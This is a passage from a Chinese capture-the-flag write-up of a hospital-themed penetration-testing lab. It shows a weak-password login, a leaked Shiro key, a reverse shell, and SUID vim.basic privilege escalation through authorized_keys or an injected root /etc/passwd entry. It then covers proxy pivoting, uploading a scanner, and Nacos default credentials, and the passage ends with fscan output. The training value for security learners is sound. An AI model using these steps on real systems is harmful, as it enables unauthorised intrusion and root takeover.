![](attachments/Pasted%20image%2020240216130244.png)
#内网渗透 #Nacos #Shiro #Fastjson #Decrypt
在这个场景中，你将扮演一名渗透测试工程师，被派遣去测试某家医院的网络安全性。你的目标是成功获取所有服务器的权限，以评估公司的网络安全状况。该靶场共有 4 个flag，分布于不同的靶机。

nmap

![](attachments/Pasted%20image%2020240802145752.png)

访问8080端口服务

![](attachments/Pasted%20image%2020240802145947.png)

弱口令 admin:admin123

明显的shiro特征，但是爆破密钥无果

![](attachments/Pasted%20image%2020240802150516.png)

又用fscan扫了一遍

![](attachments/Pasted%20image%2020240802150757.png)

`actuator`泄露

拿下shirokey

![](attachments/Pasted%20image%2020240802151910.png)

```
algMode = CBC, key = GAYysgMQhG7/CzIJlVpR2g==, algName = AES
```

工具直接执行命令

![](attachments/Pasted%20image%2020240802152045.png)

直接弹shell

`find / -user root -perm -4000 -print 2>/dev/null`

![](attachments/Pasted%20image%2020240802154503.png)

vim.basic 提权

直接利用vim.basic 向root中写自己的公钥然后ssh登录，也可以改写passwd文件增加已知密码的用户

`vim.basic /root/.ssh/authorized_keys` 
或者写/etc/passwd

```
$1$asd$sTMDZlRI6L.jJEw2I.3x8.:0:0:root:/toor:/bin/bash
密码 123
用户 toor
```

![](attachments/Pasted%20image%2020240803130627.png)

利用proxychain扫描
proxychains4 -q nxc smb 172.30.12.5/24


`scp "D:\web\scan\fscan\fscan" root@39.98.125.109:/root`

```

上传venom，配置socks代理并通过proxyfilter代理到本地
```

访问http://172.30.12.6:8848/nacos ，尝试默认密码 nacos:nacos


fscan扫描内网

```SH
root@web01:~# chmod 777 fscan
root@web01:~# ./fscan -h 172.30.12.5/24 -hn 172.30.12.5

   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.3
start infoscan
(icmp) Target 172.30.12.236   is alive
(icmp) Target 172.30.12.6     is alive
[*] Icmp alive hosts len is: 2
172.30.12.236:8009 open
172.30.12.6:8848 open
172.30.12.236:8080 open
172.30.12.6:139 open
172.30.12.6:135 open
172.30.12.6:445 open
172.30.12.236:22 open
[*] alive ports len is: 7
start vulscan
[*] NetBios 172.30.12.6     WORKGROUP\SERVER02
[*] NetInfo
[*]172.30.12.6
   [->]Server02
   [->]172.30.12.6
[*] WebTitle http://172.30.12.236:8080 code:200 len:3964   title:医院后台管理平台
[*] WebTitle http://172.30.12.6:8848   code:404 len:431    title:HTTP Status 404 – Not Found
[+] PocScan http://172.30.12.6:8848 poc-yaml-alibaba-nacos
[+] PocScan http://172.30.12.6:8848 poc-yaml-alibaba-nacos-v1-auth-bypass



